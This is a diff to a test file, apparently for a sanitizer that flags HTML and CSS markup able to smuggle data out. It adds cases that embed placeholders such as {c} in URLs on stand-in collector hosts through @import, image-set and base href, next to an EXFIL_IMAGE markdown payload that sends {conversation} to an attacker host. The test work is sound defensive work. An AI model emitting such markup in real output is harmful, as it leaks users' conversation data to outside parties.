@@ -619,6 +619,23 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<select><title></select><img src='https://collector.test/{c}.png'>", ["uncheckable_markup"]),
         ("<select><option>a</option><script>x</script></select><img src='https://a.test/a.png'>", []),
         ("<select></select><iframe src='https://a.test/'></iframe>", []),
+        ("<style>.label::after { content: 'https://docs.test/{id}'; }</style>", []),
+        ("<div style=\"font-family:'https://collector.test/{c}'\">x</div>", []),
+        ("<style>@import url('https://a.test/a.css'); .a{content:'https://collector.test/?q={c}'}</style>", []),
+        ('<style>@IMPORT "https://collector.test/{c}.css" screen;</style>', ["exfiltration_query"]),
+        (
+            "<style>.a{background:-webkit-image-set(('https://collector.test/{c}.png') 1x)}</style>",
+            ["exfiltration_query"],
+        ),
+        ("<style>.a{background:image-set('a.png' 1x) ; content:'https://collector.test/?q={c}'}</style>", []),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;http://&quot;&gt;&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<base href='https:///'><img src='https://a.test/a.png'>", []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
